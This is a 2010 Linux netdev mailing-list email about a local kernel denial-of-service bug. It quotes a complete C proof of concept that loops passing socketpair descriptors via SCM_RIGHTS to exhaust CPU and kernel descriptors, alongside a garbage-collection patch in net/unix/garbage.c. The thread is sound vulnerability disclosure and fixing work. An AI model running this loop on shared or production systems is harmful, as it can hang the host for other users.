From: =?UTF-8?B?0JzQsNGA0Log0JrQvtGA0LXQvdCx0LXRgNCz?=
	<socketpair@gmail.com>
Subject: Re: Simple kernel attack using socketpair. easy, 100% reproductiblle,
 works under guest. no way to protect :(
Date: Thu, 25 Nov 2010 11:52:47 +0500
Message-ID: <AANLkTik8Fxmd-KwGw498fMyONfVNteFcfCmz+9-V_QZh@mail.gmail.com>
References: <AANLkTikCeddPFRGojPGuB6oq3xGYgovtm8r4=WhjEDpe@mail.gmail.com>
	<1290666501.2798.84.camel@edumazet-laptop>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: QUOTED-PRINTABLE
To: Eric Dumazet <eric.dumazet@gmail.com>
Return-path: <netdev-owner@vger.kernel.org>
Received: from mail-bw0-f46.google.com ([209.85.214.46]:62497 "EHLO
	mail-bw0-f46.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1751824Ab0KYGws convert rfc822-to-8bit (ORCPT
	<rfc822;netdev@vger.kernel.org>); Thu, 25 Nov 2010 01:52:48 -0500
Received: by bwz15 with SMTP id 15so573918bwz.19
        for <netdev@vger.kernel.org>; Wed, 24 Nov 2010 22:52:47 -0800 (PST)
In-Reply-To: <1290666501.2798.84.camel@edumazet-laptop>
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

Well, It seems, that patch likely will fix 100% CPU usage.

But what about eating all available descriptors in kernel ? vulnerabili=
ty ?


2010/11/25 Eric Dumazet <eric.dumazet@gmail.com>:
> Le jeudi 25 novembre 2010 =C3=A0 10:57 +0500, =D0=9C=D0=B0=D1=80=D0=BA=
 =D0=9A=D0=BE=D1=80=D0=B5=D0=BD=D0=B1=D0=B5=D1=80=D0=B3 a =C3=A9crit :
>> #include <sys/socket.h>
>> #include <sys/un.h>
>>
>> static int send_fd (int unix_fd, int fd)
>> {
>> =C2=A0 struct msghdr msgh;
>> =C2=A0 struct cmsghdr *cmsg;
>> =C2=A0 char buf[CMSG_SPACE (sizeof (fd))];
>>
>> =C2=A0 memset (&msgh, 0, sizeof (msgh));
>> =C2=A0 memset (buf, 0, sizeof (buf));
>>
>> =C2=A0 msgh.msg_control =3D buf;
>> =C2=A0 msgh.msg_controllen =3D sizeof (buf);
>>
>> =C2=A0 cmsg =3D CMSG_FIRSTHDR (&msgh);
>> =C2=A0 cmsg->cmsg_len =3D CMSG_LEN (sizeof (fd));
>> =C2=A0 cmsg->cmsg_level =3D SOL_SOCKET;
>> =C2=A0 cmsg->cmsg_type =3D SCM_RIGHTS;
>>
>> =C2=A0 msgh.msg_controllen =3D cmsg->cmsg_len;
>>
>> =C2=A0 memcpy (CMSG_DATA (cmsg), &fd, sizeof (fd));
>> =C2=A0 return sendmsg (unix_fd, &msgh, 0);
>> }
>>
>>
>> int main ()
>> {
>> =C2=A0 int fd[2], ff[2];
>> =C2=A0 int target;
>>
>> =C2=A0 if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, fd)=3D=3D-1)
>> =C2=A0 =C2=A0 return 1;
>>
>> =C2=A0 for (;;)
>> =C2=A0 {
>> =C2=A0 =C2=A0 if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, ff)=3D=3D-=
1)
>> =C2=A0 =C2=A0 =C2=A0 =C2=A0 return 2;
>> =C2=A0 =C2=A0 send_fd (ff[0], fd[0]);
>> =C2=A0 =C2=A0 send_fd (ff[0], fd[1]);
>> =C2=A0 =C2=A0 close (fd[1]);
>> =C2=A0 =C2=A0 close (fd[0]);
>> =C2=A0 =C2=A0 fd[0] =3D ff[0];
>> =C2=A0 =C2=A0 fd[1] =3D ff[1];
>> =C2=A0 }
>> }
>
>
> Since you obviously read recent mails on this subject yesterday, why
> dont you Cc netdev ?
>
> There is a very easy way to protect against this actually.
>
> A patch was posted yesterday, and need some adjustements.
>
>
> diff --git a/net/unix/garbage.c b/net/unix/garbage.c
> index c8df6fd..40df93d 100644
> --- a/net/unix/garbage.c
> +++ b/net/unix/garbage.c
> @@ -259,9 +259,16 @@ static void inc_inflight_move_tail(struct unix_s=
ock *u)
> =C2=A0}
>
> =C2=A0static bool gc_in_progress =3D false;
> +#define UNIX_INFLIGHT_TRIGGER_GC 2000
>
> =C2=A0void wait_for_unix_gc(void)
> =C2=A0{
> + =C2=A0 =C2=A0 =C2=A0 /*
> + =C2=A0 =C2=A0 =C2=A0 =C2=A0* If number of inflight sockets is insan=
e,
> + =C2=A0 =C2=A0 =C2=A0 =C2=A0* force a garbage collect right now.
> + =C2=A0 =C2=A0 =C2=A0 =C2=A0*/
> + =C2=A0 =C2=A0 =C2=A0 if (unix_tot_inflight > UNIX_INFLIGHT_TRIGGER_=
GC && !gc_in_progress)
> + =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 unix_gc();
> =C2=A0 =C2=A0 =C2=A0 =C2=A0wait_event(unix_gc_wait, gc_in_progress =3D=
=3D false);
> =C2=A0}
>
>
>
>



--=20
Segmentation fault
